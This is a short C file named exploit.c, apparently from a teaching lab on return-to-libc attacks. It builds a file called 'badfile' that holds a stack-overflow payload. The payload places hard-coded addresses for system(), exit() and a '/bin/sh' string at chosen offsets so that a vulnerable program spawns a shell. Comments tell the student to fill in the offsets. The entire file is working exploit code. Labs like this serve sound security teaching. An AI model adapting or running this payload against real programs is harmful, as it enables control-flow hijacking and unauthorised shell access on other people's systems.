/* exploit.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
	char buf[250];
	FILE *badfile;

	badfile = fopen("./badfile", "w");

	/* You need to decide the addresses and
	the values for X, Y, Z. The order of the following
	three statements does not imply the order of X, Y, Z.
	Actually, we intentionally scrambled the order. */
	*(long *) &buf[0x1e + 12] = 0xbffffe1c ; // "/bin/sh"
	*(long *) &buf[0x1e + 4] = 0xb7e42da0 ; // system()
	*(long *) &buf[0x1e + 8] = 0xb7e369d0 ; // exit()

	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
	return 0;
}